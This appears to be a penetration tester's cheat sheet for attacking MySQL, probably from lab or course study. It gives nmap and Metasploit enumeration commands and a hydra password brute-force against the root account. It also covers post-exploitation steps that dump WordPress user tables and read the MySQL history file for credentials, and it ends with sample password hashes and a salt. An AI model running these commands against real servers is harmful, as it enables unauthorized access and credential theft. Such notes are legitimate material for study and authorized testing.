# MySQL

```
nmap -Pn -sV -sC -p3306 <ip>
```
```
searchsploit MySQL <version>
```
```
use auxiliary/scanner/mysql/mysql_version
```

```
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false
```
- Focus on `root` - most important account.

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql
```
- 

```
[ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
```

## Post-Exploitation
```
mysql -u root -p -h <ip>

# Press Enter if NULL password.
```

```
show databases;
use <database>;
show tables;
select * from <table>;

use wordpress;
select * from wp_users;

# Web app user info in the database.
```

```
cat ~/.mysql_history

# History file may contain credentials.
```

##
```
$P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
$P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/

Salt: G*=2"S^\529h#r7Y=aPP (from nmap scan)

# How to crack?
```
